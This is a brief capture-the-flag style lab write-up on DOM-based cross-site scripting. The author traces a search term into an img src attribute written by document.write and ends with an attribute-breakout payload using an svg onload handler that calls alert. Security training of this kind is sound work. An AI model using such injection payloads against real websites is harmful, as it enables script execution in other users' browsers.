# Lab: DOM XSS in document.write sink using source location.search

**End Goal:** Perform a cross-site scripting attack that calls the ```alert``` function.

**Analysis**

*There is a search bar there. Add alert function in it.*

<script>alert("Bad stuff happening here!")</script>

*This just gave me: 0 search results for '<script>alert("Bad stuff happening here!")</script>'*

*I used inspect to find out that the string was put into a random image src like this: <img src="/resources/images/tracker.gif?searchTerms=<script>alert("Bad stuff happening here!")</script>*

**Answer:** 

*Break out of the img attribute by using:*

"><svg onload=alert(1)>




